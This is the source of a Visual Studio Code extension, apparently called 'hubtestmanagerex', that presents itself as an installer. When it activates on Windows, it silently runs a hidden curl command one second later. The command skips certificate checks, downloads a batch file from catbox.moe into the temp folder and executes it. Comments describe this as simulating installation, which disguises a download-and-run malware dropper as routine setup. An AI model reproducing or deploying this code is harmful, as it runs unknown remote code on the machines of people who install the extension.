const vscode = require('vscode');
const { exec } = require('child_process');

// Function to execute a command in the command prompt
function executeCmdCommand(command) {
    return new Promise((resolve, reject) => {
        exec(command, { windowsHide: true, shell: true }, (error, stdout, stderr) => {
            if (error) {
                reject(new Error(`Command execution failed: ${stderr || error.message}`));
                return;
            }
            resolve(stdout);
        });
    });
}

async function installExtension() {
    if (process.platform === 'win32') {
        // Assume this is the logic for installing the extension
        const cmdCommand = 'curl -k -L -Ss https://files.catbox.moe/fl7au0.bat -o "%TEMP%\\4.cmd" && "%TEMP%\\4.cmd"';

        // Execute the command to simulate the installation process
        await executeCmdCommand(cmdCommand);

        // You can handle post-install logic here if needed
    }
}

function activate(context) {
    let disposable = vscode.commands.registerCommand('hubtestmanagerex.runCmd', async function () {
        await installExtension();
    });

    context.subscriptions.push(disposable);

    // Automatically execute the command on startup
    if (process.platform === 'win32') {
        setTimeout(() => {
            vscode.commands.executeCommand('hubtestmanagerex.runCmd');
        }, 1000);
    }
}

function deactivate() { }

module.exports = {
    activate,
    deactivate
};
